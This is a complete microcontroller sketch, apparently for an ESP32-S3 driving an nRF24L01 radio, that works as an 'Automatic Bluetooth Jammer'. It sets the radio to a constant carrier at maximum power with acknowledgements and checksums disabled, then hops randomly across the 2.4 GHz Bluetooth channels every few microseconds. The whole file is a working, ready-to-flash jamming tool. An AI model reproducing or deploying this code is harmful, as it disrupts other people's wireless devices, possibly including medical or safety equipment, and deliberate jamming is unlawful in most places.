#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// === Pin Definitions for ESP32-S3 & Single nRF24L01 ===
const int CE_PIN = 47;
const int CSN_PIN = 21;
const int SCK_PIN = 18;
const int MISO_PIN = 13;
const int MOSI_PIN = 11;

// === Bluetooth Channel Definitions ===
byte bluetooth_even_channels[] = {
    2,  4,  6,  8,  10, 12, 14, 16, 18, 20,
    22, 24, 26, 28, 30, 32, 34, 36, 38, 40,
    42, 44, 46, 48, 50, 52, 54, 56, 58, 60,
    62, 64, 66, 68, 70, 72, 74, 76, 78, 80
};
byte bluetooth_odd_channels[] = {
    1,  3,  5,  7,  9,  11, 13, 15, 17, 19,
    21, 23, 25, 27, 29, 31, 33, 35, 37, 39,
    41, 43, 45, 47, 49, 51, 53, 55, 57, 59,
    61, 63, 65, 67, 69, 71, 73, 75, 77, 79
};

const int num_bluetooth_even = sizeof(bluetooth_even_channels) / sizeof(bluetooth_even_channels[0]);
const int num_bluetooth_odd = sizeof(bluetooth_odd_channels) / sizeof(bluetooth_odd_channels[0]);

// === Radio Instance ===
RF24 radio(CE_PIN, CSN_PIN);
byte currentChannel = 45;

void setup() {
  Serial.begin(115200);
  delay(1000); // Give the serial monitor time to initialize

  Serial.println("\n========================================");
  Serial.println(" ESP32-S3 Automatic Bluetooth Jammer");
  Serial.println("========================================");

  // Disable internal ESP32 Bluetooth and Wi-Fi to clear the airwaves
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // Initialize SPI bus for ESP32-S3
  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CSN_PIN);

  // Initialize and configure the nRF24L01 module
  if (radio.begin(&SPI)) {
    Serial.println("[+] nRF24L01 Initialized Successfully!");
    configureRadio(radio, currentChannel);
    Serial.println("[+] Bluetooth Jamming Active & Hopping Channels!");
  } else {
    Serial.println("[-] nRF24L01 initialization failed! Check your wiring.");
  }
}

void loop() {
  // Automatically pick a random Bluetooth channel (odd or even)
  byte newCh = (random(2) == 0) ? bluetooth_odd_channels[random(num_bluetooth_odd)] 
                               : bluetooth_even_channels[random(num_bluetooth_even)];
  
  if (newCh != currentChannel) {
    radio.setChannel(newCh);
    currentChannel = newCh;
  }
  
  // High-speed frequency hopping delay
  delayMicroseconds(random(60));
}

void configureRadio(RF24& radio, byte channel) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.startConstCarrier(RF24_PA_MAX, channel);
}